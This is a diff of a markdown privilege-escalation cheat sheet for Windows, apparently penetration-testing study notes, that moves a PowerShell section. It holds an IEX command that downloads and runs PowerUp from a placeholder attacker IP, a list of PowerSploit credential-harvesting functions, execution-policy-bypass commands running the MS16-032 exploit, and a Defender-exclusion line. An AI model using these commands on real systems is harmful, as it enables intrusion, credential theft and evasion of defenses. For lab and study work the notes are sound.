@@ -310,30 +310,6 @@ qwinsta
 		> exploit/windows/local/service_permissions
 		```
 	* Can also use accesschk.exe
-- powershell
-	* check for powershell
-	```powershell
-	powershell
-	$PSVersionTable
-	$PSVersionTable.PSVersion
-	```
-	* Download Powersploit
-	```
-	IEX(New-Object Net.WebClient).downloadString('http://10.10.MY.IP/Powersploit/PowerUp.ps1')
-	Invoke-AllChecks
-	```
-	* [Powersploit](https://github.com/PowerShellMafia/PowerSploit)
-		* Get-GPPPassword
-		* Get-UnattendedInstallFile
-		* Get-Webconfig
-		* Get-ApplicationHost
-		* Get-SiteListPassword
-		* Get-CachedGPPPassword
-		* Get-RegistryAutoLogon
-	* Run exploit
-	```
-	powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
-	```
 - Processes Running as system
 	* ***Do not gloss over! IMPORTANT***
 	```systemprocesses
@@ -459,12 +435,31 @@ C:\>powershell -exec bypass - "Add-MpPreference -ExclusionPath 'D:\EvilFolder\To
 [Back](#summary)
 
 ## Powershell
-* powershell
+* Check for Powershell
+```
+powershell
+$PSVersionTable
+$PSVersionTable.PSVersion
+```
+* Download PowerUp
+	```
+	IEX(New-Object Net.WebClient).downloadString('http://10.10.MY.IP/Powersploit/PowerUp.ps1')
+	Invoke-AllChecks
+	```
+	* [PowerUp](https://github.com/PowerShellMafia/PowerSploit)
+		* Get-GPPPassword
+		* Get-UnattendedInstallFile
+		* Get-Webconfig
+		* Get-ApplicationHost
+		* Get-SiteListPassword
+		* Get-CachedGPPPassword
+		* Get-RegistryAutoLogon
+	* [More commands](#Automated-Tools)
+* Run Exploit
 MS16-032 https://www.exploit-db.com/exploits/39719/
 ```
 powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
 ```
-
 * Powershell runas
 ```
 * [owershell RunAS](https://github.com/gammathc/oscp_material/blob/master/oscp_notes.txt)
@@ -476,6 +471,7 @@ echo $script = 'c:\windows\system32\cmd.exe' >> runas.ps1
 echo Start-Process -WorkingDirectory 'C:\Windows\System32' -FilePath $script  -Credential $credential  >> runas.ps1
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File runas.ps1
 ```
+
 [Back](#summary)
 
 ## Automated Tools
